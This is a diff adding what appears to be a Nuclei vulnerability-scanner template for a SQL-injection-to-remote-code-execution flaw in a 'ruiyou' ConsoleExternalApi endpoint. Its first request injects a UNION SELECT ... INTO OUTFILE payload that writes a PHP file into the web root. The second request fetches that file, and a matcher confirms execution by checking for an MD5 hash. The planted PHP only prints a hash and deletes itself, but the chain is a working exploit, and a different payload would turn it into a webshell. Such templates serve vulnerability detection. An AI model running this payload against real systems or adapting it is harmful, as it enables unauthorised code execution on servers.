@@ -1,0 +1,35 @@
+id: ruiyou-ConsoleExternalApi-sql-rce
+info:
+  name: ruiyou-ConsoleExternalApi-sql-rce
+  author: changge
+  severity: high
+
+http:
+  - raw:                
+      - |
+        POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
+        Host: 
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+        {
+        "account": "1' union select '<?php echo(md5(\"123\"));unlink(__FILE__);?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\abc.xgi'#",
+        "userPwd": "1"
+        }
+        
+      - |
+        GET /abc.xgi HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Upgrade-Insectre-Requests: 1
+        Connection: close
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Cache-Control: no-cache
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Language: zh-CN,zh;g=0.9
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"202cb962ac59075b964b07152d234b70")
